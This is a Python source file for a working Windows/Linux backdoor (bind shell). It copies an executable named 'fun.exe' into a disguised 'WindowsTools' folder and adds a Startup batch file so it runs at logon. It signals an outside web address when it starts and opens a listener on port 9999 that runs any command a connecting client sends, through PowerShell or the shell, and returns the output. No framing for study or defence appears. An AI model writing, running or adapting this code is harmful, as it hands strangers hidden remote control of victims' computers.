import subprocess
import socket
import os
import requests
import sys
from getpass import getuser
from shutil import copyfile

URL = "https://lukemcewen.com/script.php"
PORT = 9999
USERNAME = getuser()

def add_to_startup():
    d = os.environ['USERPROFILE']+"\\WindowsTools"
    os.mkdir(d)
    d = d+"\\"+"fun.exe"
    copyfile(os.environ['USERPROFILE']+"\\Downloads\\fun.exe", d)

    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USERNAME
    with open(bat_path + '\\' + "WindowsTools.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % d)

def get_ip():
    if sys.platform == "win32":
        if "WindowsTools" not in __file__:
            add_to_startup()
        return socket.gethostbyname(socket.gethostname()), True
    else:
        from re import findall
        ifconfig = subprocess.getoutput("ifconfig")
        lst = findall("(?!255)(?!5)[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.(?!255)[0-9]{1,3}", ifconfig)
        tmp = [x for x in lst if x != "127.0.0.1"]
        return tmp[0], False

def main():
    try:
        ip, powershell = get_ip()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, PORT))
        s.listen()
        requests.get(URL)
        
        while True:
            client, _ = s.accept()
            client.send("[*] Connection Established\n".encode())
            done = False
            try:
                while not done:
                    client.send(str.encode(os.getcwd() + ">"))
                    data = client.recv(1024).decode("UTF-8").strip()
                    if data == "exit":
                        client.send("Goodbye...".encode())
                        client.close()
                        done = True
                    elif data[:2] == "cd":
                        os.chdir(data[3:])
                    elif len(data) > 0:
                        if powershell:
                            proc = subprocess.Popen(f"powershell.exe {data}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        else:
                            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        stdout_value = proc.stdout.read() + proc.stderr.read()
                        output_str = str(stdout_value, "UTF-8")
                        client.send(str.encode("\n" + output_str))
            except Exception as _:
                    continue
    except KeyboardInterrupt:
        s.close()
        sys.exit()

if __name__ == "__main__":
    main()